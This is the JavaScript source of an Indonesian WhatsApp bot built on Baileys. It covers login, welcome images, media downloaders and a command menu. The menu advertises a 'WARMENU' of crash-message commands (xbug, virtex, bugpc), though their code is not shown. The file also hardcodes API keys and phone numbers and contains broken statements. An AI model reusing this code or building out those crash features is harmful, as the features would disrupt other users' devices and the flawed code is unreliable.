///note:disini gw hanya recode (jangan asal nuduh atau meng hina yaa)
////gw dah izin ama yg punya base
///base by:yogipw,hexagonz&FebzOfc
///Buat yg Namanya Takim, Lu kont Jan di ganti semua anj
///Thanks too jan di hapus konttol
///silahkan edit disini
///kalau thanks too di hapus w enc semua sc w selanjutnya
const {
	WAConnection,
	Presence,
    MessageOptions,
    Mimetype,
    WALocationMessage,
    MessageType,
    WA_MESSAGE_STUB_TYPES,
    ReconnectMode,
    ProxyAgent,
    GroupSettingChange,
    waChatKey,
    mentionedJid,
    processTime
} = require("@adiwajshing/baileys")
const hx = require('hxz-api')
const ffmpeg = require('fluent-ffmpeg')
const axios = require('axios')
const { exec } = require('child_process')
const { fetchJson, color, bgcolor } = require('./lib/fetcher')
const { y2mate } = require('./lib/y2mate');
const { y2mateA, y2mateV } = require('./lib/y2mate.js')
const { yta, ytv, igdl, upload, formatDate } = require('./lib/ytdl')
const { wikiSearch } = require('./lib/wiki.js')
const { wait, getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, start, success, close } = require('./lib/function')

const fetch = require('node-fetch')
const get = require('got')
const speednye = require('performance-now')
const fs = require('fs')
const os = require('os')
const qrcode = require('qrcode-terminal')
const moment = require('moment-timezone')
const welkom = JSON.parse(fs.readFileSync('./lib/group/welcome.json'))
const yts = require('yt-search')
const request = require('request')
const pebz = new WAConnection()
const {
	OwnerNumber,
	prefix,
	lol
} = require('./lib/config.json')

fake = '𝗞𝗔𝗕𝗔𝗡𝗘𝗥𝗜𝗕𝗢𝗧\nStatus : Online'
let gambar = "" || fs.readFileSync('./media/gambar/biasa.png')
self = false
blocked = []

// SYSTEM QRCODE
pebz.ReconnectMode = 2
pebz.logger.level = 'warn'
pebz.version = [2, 2143, 3]
pebz.browserDescription = ['KabaneriBot By ZansLord', 'Safari', '3.0']
console.log(start)
console.log('>', '[',color('Berhasil Tersambung Ke Perangkat','lime'),']','ZANSSELF')
pebz.on('qr', qr => {
qrcode.generate(qr, { small : true })
console.log(color(`[ KABANERI BOT ] SCAN QR DI ATAS BRAD`,'white'))
})

pebz.on('credentials-updated', () => {
	const authinfo = pebz.base64EncodedAuthInfo()
	console.log('session has bin save')
	fs.writeFileSync('./zans.json', JSON.stringify(authinfo, null, '\t'))
})
   fs.existsSync('./zans.json') && pebz.loadAuthInfo('./zans.json')
   pebz.connect();
 
   pebz.on('CB:Blocklist', json => {
            if (blocked.length > 2) return
	    for (let i of json[1].blocklist) {
	    	blocked.push(i.replace('c.us','s.whatsapp.net'))
	    }
	}) 
	
	pebz.on("CB:Call", json => {
		let call;
		calling = JSON.parse(JSON.stringify(json))
		call = calling[1].from
		setTimeout(function(){
			pebz.sendMessage(call, 'Maaf, saya tidak bisa menerima panggilan. note: jangan telpon kabane huh😑, nelfon kabane = block!.\nJika ingin membuka block harap chat Owner!\nhttps//wa.me/+6285869074622', MessageType.text)
			.then(() => pebz.blockUser(call, "add"))
			}, 100);
		})
		
		
    pebz.on('group-participants-update', async(chat) => {
        try {
            mem = chat.participants[0]
            try {
                var pp_user = await pebz.getProfilePicture(mem)
            } catch (e) {
                var pp_user = 'https://www.linkpicture.com/q/20211125_113714.jpg'
            }
            try {
                var pp_group = await pebz.getProfilePicture(chat.jid)
            } catch (e) {
                var pp_group = 'https://www.linkpicture.com/q/20211125_113714.jpg'
            }
            if (chat.action == 'add') {
                ini_user = pebz.contacts[mem]
                group_info = await pebz.groupMetadata(chat.jid)
                ini_img = await getBuffer(`https://api.dapuhy.ga/api/canvas/welcome2?name=${ini_user.notify}&discriminator=${group_info.participants.length}&member=${group_info.participants.length}&gcname=${group_info.subject}&pp=${pp_user}&bg=https://www.linkpicture.com/q/20211125_113317.jpg&apikey=lordpebri`)                     
                welkam = `${ini_user.notify}, Welkam to ${group_info.subject}`
                await pebz.sendMessage(chat.jid, ini_img, MessageType.image, { caption: welkam })
            }
            if (chat.action == 'remove') {
                ini_user = pebz.contacts[mem]
                group_info = await pebz.groupMetadata(chat.jid)
                 ini_img = await getBuffer(`https://api.dapuhy.ga/api/canvas/goodbye2?name=${ini_user.notify}&discriminator=${group_info.participants.length}&member=${group_info.participants.length}&gcname=${group_info.subject}&pp=${pp_user}&bg=https://www.linkpicture.com/q/20211125_113317.jpg&apikey=lordpebri`)   
                ini_out = `${ini_user.notify}, Sayonara 👋`
                await pebz.sendMessage(chat.jid, ini_img, MessageType.image, { caption: ini_out})
            }
        } catch (e) {
            console.log('Error :', e)
        }
    })
		
		
		
	    pebz.on('chat-update', async (mek) => {
		try {
			if (!mek.hasNewMessage) return
            mek = mek.messages.all()[0]
			if (!mek.message) return
			if (mek.key && mek.key.remoteJid == 'status@broadcast') return
			if (mek.key.fromMe) return
			global.blocked
			global.prefix
			const content = JSON.stringify(mek.message)
			const from = mek.key.remoteJid
			const type = Object.keys(mek.message)[0]
			const { text, extendedText, contact, contactsArray, groupInviteMessage, listMessage, buttonsMessage, location, liveLocation, image, video, sticker, document, audio, product, quotedMsg } = MessageType
			
			const time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
			const wita = moment.tz("Asia/Makassar").format("HH:mm:ss")
			body = (type === 'conversation' && mek.message.conversation.startsWith(prefix)) ? mek.message.conversation : (type == 'imageMessage') && mek.message[type].caption.startsWith(prefix) ? mek.message[type].caption : (type == 'videoMessage') && mek.message[type].caption.startsWith(prefix) ? mek.message[type].caption : (type == 'extendedTextMessage') && mek.message[type].text.startsWith(prefix) ? mek.message[type].text : (type == 'listResponseMessage') && mek.message[type].singleSelectReply.selectedRowId ? mek.message[type].singleSelectReply.selectedRowId : (type == 'buttonsResponseMessage') && mek.message[type].selectedButtonId ? mek.message[type].selectedButtonId : ''
			budy = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
			const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()
			const args = body.trim().split(/ +/).slice(1)
			const isCmd = body.startsWith(prefix)
           
            const botNumber = pebz.user.jid
			const ownerNumber = ['6285869074622@s.whatsapp.net',`${OwnerNumber}@s.whatsapp.net`]
			const isGroup = from.endsWith('@g.us')
			const sender = isGroup ? mek.participant : mek.key.remoteJid
			pushname = pebz.contacts[sender] != undefined ? pebz.contacts[sender].vname || pebz.contacts[sender].notify : undefined
			const groupMetadata = isGroup ? await pebz.groupMetadata(from) : ''
			const groupName = isGroup ? groupMetadata.subject : ''
			const groupId = isGroup ? groupMetadata.jid : ''
			const q = args.join(' ')
			const groupMembers = isGroup ? groupMetadata.participants : ''
			const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
			const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
			const isGroupAdmins = groupAdmins.includes(sender) || false
            const isWelcome = isGroup ? welkom.includes(from):false
			const isOwner = ownerNumber.includes(sender)

const sendFile = async (medya, namefile, capti, tag, vn) => {
  baper = await getBuffer(medya)
  mimi = ''
  if (namefile.includes('m4a')){
  pebz.sendMessage(from, baper, audio,{mimetype: 'audio/mp4',quoted: tag, filename: namefile, ptt: vn})
  }
  if (namefile.includes('mp4')){
  pebz.sendMessage(from, baper, video, {mimetype: 'video/mp4', quoted: tag, caption: capti, filename: namefile})
  }
  if (namefile.includes('gif')){
  pebz.sendMessage(from, baper, video, {mimetype: Mimetype.gif, caption: capti, quoted: tag, filename: namefile})
  } 
  if (namefile.includes('png')){
  pebz.sendMessage(from, baper, image, {quoted: tag, caption: capti, filename: namefile})
  }
  
  if (namefile.includes('webp')){
  pebz.sendMessage(from, baper, sticker, {quoted: tag})
  } else {
  kobe = namefile.split(`.`)[1]
  client.sendMessage(from, baper, document, {mimetype: kobe, quoted: tag, filename: namefile})
  }
}
const sendFileFromUrl = async(link, type, options) => {
hasil = await getBuffer(link)
pebz.sendMessage(from, hasil, type, options).catch(e => {
fetch(link).then((hasil) => {
pebz.sendMessage(from, hasil, type, options).catch(e => {
pebz.sendMessage(from, { url : link }, type, options).catch(e => {
reply('_[ ! ] Error Gagal Dalam Mendownload Dan Mengirim Media_')
console.log(e)
})
})
})
})
}

			const isUrl = (url) => {
			    return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/, 'gi'))
			}
			const reply = (teks) => {
				pebz.sendMessage(from, teks, text, {quoted:mek})
			}
			const sendMess = (hehe, teks) => {
				pebz.sendMessage(hehe, teks, text)
			}
			const mentions = (teks, memberr, id) => {
				(id == null || id == undefined || id == false) ? pebz.sendMessage(from, teks.trim(), extendedText, {contextInfo: {"mentionedJid": memberr}}) : pebz.sendMessage(from, teks.trim(), extendedText, {quoted: mek, contextInfo: {"mentionedJid": memberr}})
			}  
			const sendWebp = async(from, url) => {
                var names = Date.now() / 10000;
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, './trash' + names + '.png', async function () {
                    console.log('selesai');
                    let ajg = './trash' + names + '.png'
                    let palak = './trash' + names + '.webp'
                    exec(`ffmpeg -i ${ajg} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${palak}`, (err) => {
                        let media = fs.readFileSync(palak)
                        pebz.sendMessage(from, media, MessageType.sticker,{quoted:mek})
                        fs.unlinkSync(ajg)
                        fs.unlinkSync(palak)
                    });
                });
            }
			const sendMedia = async(from, url, text="", mids=[]) =>{
                if(mids.length > 0){
                    text = normalizeMention(from, text, mids)
                } 
                const fn = Date.now() / 10000;
                const filename = fn.toString()
                let mime = ""
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        mime = res.headers['content-type']
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, filename, async function () {
                    console.log('kelar');
                    let media = fs.readFileSync(filename)
                    let type = mime.split("/")[0]+"Message"
                    if(mime === "image/gif"){
                        type = MessageType.video
                        mime = Mimetype.gif
                    }
                    if(mime.split("/")[0] === "audio"){
                        mime = Mimetype.mp4Audio
                    }
                    pebz.sendMessage(from, media, type, { quoted: mek, mimetype: mime, caption: text,contextInfo: {"mentionedJid": mids}})
                    
                    fs.unlinkSync(filename)
                });
            }
            const sendStickerFromUrl = async(to, url) => {
                var names = Date.now() / 10000;
                var download = function (uri, filename, callback) {
                request.head(uri, function (err, res, body) {
                request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                });
                };
                download(url, './stik' + names + '.png', async function () {
                console.log('Done Kak Pebri');
                let filess = './stik' + names + '.png'
                let asw = './stik' + names + '.webp'
                exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {
                let media = fs.readFileSync(asw)
                pebz.sendMessage(to, media, MessageType.sticker,{quoted:mek})
                fs.unlinkSync(filess)
                fs.unlinkSync(asw)
                });
                });
                }			


        
	        mess = {
				wait: 'tunggu sebentar.......',
				success: 'Sucess ✓“',
				notxt: 'textnya mana ?',
				error: {
					stick: 'gagal saat konvensi gambar ke sticker',
					Iv: 'link nya mokd :v'
				},
				only: {
					group: 'Khusus Grup!',
					ownerB: 'Khusus Owner Bot',
					admin: 'Khusus Admin grup'
				}
			}
		   const lordpeb = {
	key : {
           participant : '0@s.whatsapp.net'
                        },
       message: {
                    liveLocationMessage: {
                    caption: `${pushname} ${pushname}`,
                    jpegThumbnail: gambar
                          }
                        }
                      }
           const fkontak = { 
           key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: `0@s.whatsapp.net` } : {}) }, message: { 'contactMessage': { 'displayName': `Hallo Kak ${pushname}\nSilahkan Pilih Menunya`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': gambar}}}                   		
        const sendButton = async (from, context, fortext, but, mek) => {
        buttonMessages = {
        contentText: context,
        footerText: fortext,
        buttons: but,
        headerType: 1
            }
        pebz.sendMessage(from, buttonMessages, buttonsMessage, {
        quoted: fkontak
        })
        }
        const sendButMessage = (id, text1, desc1, but = [], options = {}) => {
        const buttonMessage = {
        contentText: text1,
        footerText: desc1,
        buttons: but,
        headerType: 1,
        };
        pebz.sendMessage(
        id,
        buttonMessage,
        MessageType.buttonsMessage,
        options
        );
        };
        const sendButImage = async (from, context, fortext, img, but, mek) => {
        jadinya = await pebz.prepareMessage(from, img, image)
        buttonMessagesI = {
        imageMessage: jadinya.message.imageMessage,
        contentText: context,
        footerText: fortext,
        buttons: but,
        headerType: 4
        }
        pebz.sendMessage(from, buttonMessagesI, buttonsMessage, {
        quoted: fkontak,
        })
        }
        async function sendButLocation(id, text1, desc1, gam1, but = [], options = {}) {
        const buttonMessages = { locationMessage: { jpegThumbnail: gam1 }, contentText: text1, footerText: desc1, buttons: but, headerType: 6 }
        return pebz.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
        }
const time2 = moment().tz("Asia/Makassar").format("HH:mm:ss");
    if (time2 < "24:59:00") {
      var ucapanWaktu = "GoodNight🌃";
    }
    if (time2 < "19:00:00") {
      var ucapanWaktu = "GoodEvening🌞";
    }
    if (time2 < "18:00:00") {
      var ucapanWaktu = "GoodEvening🌄";
    }
    if (time2 < "15:00:00") {
      var ucapanWaktu = "GoodAfternoon☀️";
    }
    if (time2 < "11:00:00") {
      var ucapanWaktu = "GoodMoorning🌅";
    }
    if (time2 < "05:00:00") {
      var ucapanWaktu = "GoodNight🌃";
    }
    function kyun(seconds){
  function pad(s){
    return (s < 10 ? '0' : '') + s;
  }
  var hours = Math.floor(seconds / (60*60));
  var minutes = Math.floor(seconds % (60*60) / 60);
  var seconds = Math.floor(seconds % 60);
  return `${pad(hours)}:${pad(minutes)}:${pad(seconds)}`
}			
			colors = ['red','white','black','blue','yellow','green']
	     	const isMedia = (type === 'imageMessage' || type === 'videoMessage')
            const isQuotedText = type === 'extendedTextMessage' && content.includes('textMessage')
            const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
            const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
            const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
           const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
			if (!isGroup && isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mPEBSELF\x1b[1;37m]', time, color(command), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
        	if (isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mPEBSELF\x1b[1;37m]', time, color(command), 'from', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))        	        	
            if (self === true && !isOwner && isCmd) return
          
           
             switch(command) {
             case 'menu':
             case 'help':
             uptime = process.uptime()            
		     const hiya = await fetchJson('https://xinzbot-api.herokuapp.com/api/ucapan?apikey=XinzBot&timeZone=Asia/Jakarta', {method:'get'})
		     var p = '```'
		    const tod =`*_KABANERI BOT BY:ZANSLORD_*
${p}👋${ucapanWaktu}kak ${pushname}${p}		    
${p}🔑Prefix : ${prefix}${p}
${p}⏳Runtime : ${kyun(uptime)}${p}`
tod2 =`
*_📋MENU KABANERI BOT_*
${p}🗞${prefix}infobot${p}
${p}📴${prefix}self${p}
${p}📳${prefix}public${p}
${p}🔊${prefix}broadcast${p} 
${p}📚${prefix}write <text>${p}
${p}🍃${prefix}play <query>${p}
${p}🔎${prefix}wiki <query>${p}
${p}🖼️${prefix}pinterest <query>${p}
${p}📴${prefix}quotesharian${p}

*_😈WARMENU_*
${p}👿${prefix}xbug${p}
${p}👿${prefix}bugbutton${p}
${p}👿${prefix}bugrow${p}
${p}👿${prefix}bugcombine${p}
${p}👿${prefix}tesbug${p}
${p}👿${prefix}bugpc${p}
${p}👿${prefix}bugtroli2${p}
${p}👿${prefix}bugtroli3${p}
${p}👿${prefix}virtex${p}
${p}👿${prefix}tovirvid${p}
${p}👿${prefix}tovirgam${p}
${p}👿${prefix}bugkatalog (perbaikan)${p}
${p}👿${prefix}bugloc${p}
${p}👿${prefix}buglokasi${p}
${p}👿${prefix}x${p}

*_🎮FUNTIME_*
${p}🆚${prefix}truth${p}
${p}🆚${prefix}dare${p}
${p}🤖${prefix}simi <text>${p}
${p}🎆${prefix}zodiak${p}
${p}😲${prefix}pintarcek${p}
${p}😙${prefix}gantengcek${p}
${p}😆${prefix}cantikcek${p}
${p}😈${prefix}cek mati${p}

*_📗MAKERMENU_*
${p}🦖${prefix}attp${p}
${p}🦕${prefix}battlefield${p}
${p}🦔${prefix}blackbird${p}
${p}🦒${prefix}codetxt${p}
${p}🦓${prefix}coffeecup${p}
${p}🍃${prefix}coffeecup2${p}
${p}🍂${prefix}dance${p}
${p}🍁${prefix}express${p}
${p}🌿${prefix}foliokanan${p}
${p}🌾${prefix}foliokiri${p}
${p}🌵${prefix}glitch${p}
${p}🌴${prefix}glow${p}
${p}🦒${prefix}goldbutton${p}
${p}🦂${prefix}golden${p}
${p}🕷${prefix}googletxt${p}
${p}🐞${prefix}hallowen${p}
${p}🐝${prefix}hengker (reply Gambarnya)${p}
${p}🐜${prefix}hengker2 (reply Gambarnya)${p}
${p}🐛${prefix}maker2d2${p}
${p}🐌${prefix}maker2d3${p}
${p}🦋${prefix}maker2d4${p}
${p}🦑${prefix}maker3d${p}
${p}🦐${prefix}maker3d2${p}
${p}🦀${prefix}maker3d3${p}
${p}🐚${prefix}maker3d4${p}
${p}🐙${prefix}matrix${p}
${p}🦈${prefix}neon${p}
${p}🐡${prefix}nulis${p}
${p}🐠${prefix}nuliskiri${p}
${p}🐟${prefix}nuliskanan${p}
${p}🐬${prefix}nostonk (reply Gambarnya)${p}
${p}🐋${prefix}patrick${p}
${p}🐳${prefix}pornhub (teks|teks)${p}
${p}🐉${prefix}qrcode${p}
${p}🦉${prefix}readmore${p}
${p}🦆${prefix}rip (reply Gambarnya)${p}
${p}🦅${prefix}semoji${p}
${p}🐧${prefix}shareloc${p}
${p}🐦${prefix}silverbutton${p}
${p}🐥${prefix}stonk (reply Gambarnya)${p}
${p}🐹${prefix}spiderman${p}
${p}🐨${prefix}spongebob (reply Gambarnya)${p}
${p}🐻${prefix}summer${p}
${p}🐿${prefix}tahta${p}
${p}🐰${prefix}text3d${p}
${p}🐹${prefix}tinyurl${p}
${p}🐀${prefix}toimg${p}
${p}🐷${prefix}tomp3${p}
${p}🐮${prefix}totext${p}
${p}🦌${prefix}tourl${p}
${p}🐴${prefix}transformer${p}
${p}🐯${prefix}ttp${p}
${p}🦁${prefix}tts${p}
${p}🐱${prefix}vampire${p}
${p}🦊${prefix}viewonce${p}
${p}🐺${prefix}warrior${p}
${p}🐶${prefix}wooden${p}

*_🤓DATABASEMENU_*
${p}😯${prefix}addsticker${p}
${p}😯${prefix}liststicker${p}
${p}😶${prefix}addvn${p}
${p}😶${prefix}listvn${p}
${p}🤡${prefix}addimage${p}
${p}🤡${prefix}listimage${p}

*_😗GROUPMENU_*
${p}🤠${prefix}add/kick${p}
${p}🚻${prefix}ngewe${p}
${p}🦊${prefix}jadian${p}
${p}❓${prefix}caklontong${p}
${p}🕯${prefix}artimimpi${p}
${p}🎃${prefix}fitnahpc${p}
${p}😚${prefix}join <linkgrup>${p}
${p}😗${prefix}totag <reply pesan>${p}
${p}😒${prefix}tagall${p}

*_😆STICKERMENU_*
${p}👻${prefix}sticker <replyimg>${p}
${p}👻${prefix}swm teks|teks${p}
${p}👻${prefix}take teks|teks${p}

*_😫PRIVATECHAT_*
${p}😀${prefix}joinn <linkgrup>${p}

*_FOR FEEDBACK_*
${p}😊${prefix}report${p}

*_😉ThanksToo_*
• Allah Swt
• Ortu
• AllFriends
• ZansLord(recode)
• Abdul Malik(nambah fitur)
• FebzOfc(yg punya base)
• Dittaz(Yg ajarin w recode)
• Zeeoneofc(yg ajarin w)
• Project pebz(case:v)
• YogiPw(creator)
• Hexagonz(creator)
• Penyedia api dan case
• AllOwnerBot

*_ɪɴғᴏ ʙᴏᴛ_*
» ɢᴜɴᴀᴋᴀɴ ! ᴜɴᴛᴜᴋ ᴄᴏᴍᴍᴀɴᴅ
» ᴛᴇᴋs ᴊᴀɴɢᴀɴ ᴛᴇʀʟᴀʟᴜ ᴘᴀɴᴊᴀɴɢ

Made With❣️
`           
           but = [
          { buttonId: `${prefix}owner1`, buttonText: { displayText: 'creator' }, type: 1 },
          { buttonId: `${prefix}ruls`, buttonText: { displayText: 'rulesbot' }, type: 1 }
                  ]
        sendButLocation(from, tod, tod2, gambar, but)
           break
           
           
           case 'ruls':
txt = `
*「 PERATURAN BOT 」*

1. DILARANG TELFON BOT!!
2. DILARANG SPAM BOT
3. DILARANG BERKATA KASAR
4. DILARANG SPAM VIRTEX
5. DILARANG TELEFON OWNER
6. DILARANG SPAM GROUP
7. DILARANG SPAM ADMIN
8. DILARANG BERKATA KASAR DI GC

⚠️JIKA KALIAN MELANGGAR.. AKAN DI BLOCK + BANNED!!`
           but = [
          { buttonId: `${prefix}donate`, buttonText: { displayText: 'DONATE🦊' }, type: 1 },
          { buttonId: `${prefix}menu`, buttonText: { displayText: 'MENU🐱' }, type: 1 }
                  ]
        sendButLocation(from, tod, tod2, gambar, but)
           break
           
           
case 'donate':
txt = `Hi, *${id.split("@s.whatsapp.net")[0]}* 👋️
Mau donasi? ✨

⚠️Runtime: ${kyun(uptime)}${p}

♻ Silahkan donasi dibawah ini :
   
⚜ *OVO*: 085869074622
⚜ *#DANA*: 085869074622
⚜ *#PULSA*: 085869074622
⚜ *#GOPAY*: 085869074622

📺 *Iklan* :

✅ Follow akun instagram admin www.instagram.com/abdulmalik_4342

♻️ _TETAP JAGA KESEHATAN DAN SELALU PAKAI MASKER!_

♻️ Mau pasang iklan di *KABANERIBOT?*
☎️ WA : *wa.me/+6285869074622*
  
⚠️ Gunakan dengan bijak ‼️
⚠️ Bot ini berjalan 24 Jam‼️

✳️ *BLACK TEAM [1] : https://chat.whatsapp.com/LTL9J5K0dxp65WspruIQuW

✳️ *EXTREAM GRUP* [2] : https://chat.whatsapp.com/Jk6TLnLOVGQGlbzh6577Qw

  
🔰 -----[ *POWERED BY KABANERI-BOT* ]----- 🔰`
           but = [
          { buttonId: `${prefix}sc`, buttonText: { displayText: 'SC BOT' }, type: 1 },
          { buttonId: `${prefix}group`, buttonText: { displayText: 'Group Bot' }, type: 1 }
                  ]
        sendButLocation(from, tod, tod2, gambar, but)
           break
           
case 'sc':
txt = `
bot ini menggunakan sc dari : https://github.com/ZansLord/KABANERI-BOT-V2`
           but = [
          { buttonId: `${prefix}menu`, buttonText: { displayText: 'MENU' }, type: 1 },
                  ]
        sendButLocation(from, tod, tod2, gambar, but)
           break
case 'group':
txt = `
BLACK TEAM: https://chat.whatsapp.com/LTL9J5K0dxp65WspruIQuW
EXTREAM: https://chat.whatsapp.com/Jk6TLnLOVGQGlbzh6577Qw
REVOLUTION: https://chat.whatsapp.com/BFXePvxJSdvAxQrMonrbG4
`
case 'infobot'
txt = `
Hi, *${id.split("@s.whatsapp.net")[0]}* 👋️
Berikut adalah info pada bot ini!✨

⚠️ Runtime: ${kyun(uptime)}${p}

♻ INFO BOT! :
   
⚜ *GITHUB*: https://github.com/ZansLord/KABANERI-BOT-V2
⚜ *AUTHOR*: ZANSLORD
⚜ *DESIGNER*: ZANSLORD
⚜ *YOUTUBE*: ZansLord


♻ INFO LAIN! :

OH IYA SCRIPT INI 100% GRATIS KOK.
SCRIPT DIBUAT DENGAN BAHASA PEMROGRAMAN NODE.JS
UPDATE BOT TERBARU DI https://github.com/ZansLord

♻️ JANGAN  LUPA DONASI AGAR BOT AKTIF TERUS!
♻️ MAU DONASI? SILAHKAN KETIK #donate

📺 *Iklan* :

✅ Follow akun instagram admin https://github.com/abdulmalik_4342

♻️ _TETAP JAGA KESEHATAN DAN SELALU PAKAI MASKER!_

♻️ Mau pasang iklan di KABANERI BOT ?*
☎️ WA : *wa.me/+6285869074622*
  
⚠️ Gunakan dengan bijak ‼️
⚠️ Bot ini berjalan ${kapanbotaktif} ‼️

✳️ *BLACK TEAM [1] : https://chat.whatsapp.com/LTL9J5K0dxp65WspruIQuW

✳️ *EXTREAM GRUP* [2] : https://chat.whatsapp.com/Jk6TLnLOVGQGlbzh6577Qw

  
🔰 -----[ *POWERED BY KABANERI-BOT ]----- 🔰`
const pebz2 = {
            contextInfo: {
            participant: '0@s.whatsapp.net',
            remoteJid: 'status@broadcast',
            isForwarded: true,
            forwardingScore: 8,
           quotedMessage: {
           imageMessage: {
           caption: fake,
           jpegThumbnail: gambar,
           mimetype: 'image/jpeg',
           }
           }
           }
           } 
           pebz.sendMessage(from, txt, MessageType.text, pebz2)
           break
           case 'quotesimg':
           case 'quotesharian':
           todzi = await getBuffer(`https://api.lolhuman.xyz/api/random/quotesimage?apikey=${lol}`)
           pebz.sendMessage(from, todzi, image, {quoted : mek })
           break
           case 'simi':
           if (args.length == 0) return reply(`Hallo Kak ${pushname}`)
           teksni = args.join(" ")
           get_result = await fetchJson(`https://api.lolhuman.xyz/api/simi?apikey=${lol}&text=${teksni}`)
           getresult = get_result.result
             reply(getresult)         
             break           
             case 'pinterest':
             if (args.length == 0) return reply(`Example: ${prefix + command} loli kawaii`)
             query = args.join(" ")
             ini_url = await fetchJson(`https://api.lolhuman.xyz/api/pinterest?apikey=${lol}&query=${query}`)
             ini_url = ini_url.result
             ini_buffer = await getBuffer(ini_url)
             await pebz.sendMessage(from, ini_buffer, image, { quoted: mek })
             break
             case 'wiki':
            if (args.length < 1) return reply(' Yang Mau Di Cari Apa? ')
            teks = args.join(' ')
            resa = await wikiSearch(teks).catch(e => {
            return reply('_[ ! ] Error Hasil Tidak Ditemukan_') 
            }) 
result = `❒「  *Wiki*  」
├ *Judul :* ${resa[0].judul}
└ *Wiki :* ${resa[0].wiki}`
           sendFileFromUrl(resa[0].thumb, image, {quoted: fkontak, caption: result}).catch(e => {
           reply(result)
           })
        break
        case 'play':
        if (args.length < 1) return reply(`Kirim perintah *${prefix}play query`)
        reply(mess.wait)
        let yut = await yts(q)
        yta(yut.videos[0].url)             
        .then(async(res) => {
        const { thumb, title, filesizeF, filesize } = res
        const capti = `𝗬𝗢𝗨𝗧𝗨𝗕𝗘 𝗣𝗟𝗔𝗬🍁
		     
•💬 Judul : ${yut.all[0].title}
•🎥 ID Video : ${yut.all[0].videoId}
•⏰️ Diupload Pada : ${yut.all[0].ago}
•👁️️ Views : ${yut.all[0].views}
•▶️ Durasi : ${yut.all[0].timestamp}
•📍 Channel : ${yut.all[0].author.name}
•🔗 Link Channel : ${yut.all[0].author.url}
•📓 Note Dari Zans: Jangan spam ya bang!`      
        ya = await getBuffer(thumb)
        py =await pebz.prepareMessage(from, ya, image)
        gbutsan = [{buttonId: `${prefix}buttonmusic ${yut.all[0].url}`, buttonText: {displayText: '🎵AUDIO'}, type: 1},{buttonId: `${prefix}buttonvideo ${yut.all[0].url}`, buttonText: {displayText: '🎥VIDEO'}, type: 1}]
        gbuttonan = {
        imageMessage: py.message.imageMessage,
        contentText: capti,
        footerText: 'Silahkan Pilih Jenis File Dibawah Ini☕',
        buttons: gbutsan,
        headerType: 4
}
        await pebz.sendMessage(from, gbuttonan, MessageType.buttonsMessage)})
        break                
        case 'buttonmusic':
        if(!q) return reply('linknya?')              
        res = await yta(`${q}`).catch(e => {
        reply('```[ ! ] Error Saat Mengirim Audio```')})
        sendMedia(from, `${res.dl_link}`,{quoted:mek})
        break         
        case 'buttonvideo':
        if(!q) return reply('linknya?')            
        res = await ytv(`${q}`).catch(e => {
        reply('```[ ! ] Error Saat Mengirim Video```')})
        sendMedia(from, `${res.dl_link}`,'Nih Kack')
        break                      
        case 'tiktokdl':
        if (args.length == 0) return reply(`Contoh: ${prefix + command} https://vt.tiktok.com/ZSwWCk5o/`)
         ini_url = args[0]
        ini_url = `http://api.lolhuman.xyz/api/tiktok?apikey=DashBot&url=${ini_url}`
        get_result = await fetchJson(ini_url)
        ini_buffer = await getBuffer(get_result.result.link)
        pebz.sendMessage(from, ini_buffer, video, { quoted: mek })
        break
        case 'tiktokmusic':
        if (args.length == 0) return reply(`Example: ${prefix + command} https://vt.tiktok.com/ZSwWCk5o/`)
        reply('tunggu broo')
        ini_link = args[0]
        get_audio = await getBuffer(`https://api.lolhuman.xyz/api/tiktokmusic?apikey=${lol}&url=${ini_link}`)
        await pebz.sendMessage(from, get_audio, audio, { mimetype: Mimetype.mp4Audio, quoted: mek })
        break         
        case 'trut':
        case 'truth':
        if (!isGroup) return reply('KhususGrup')
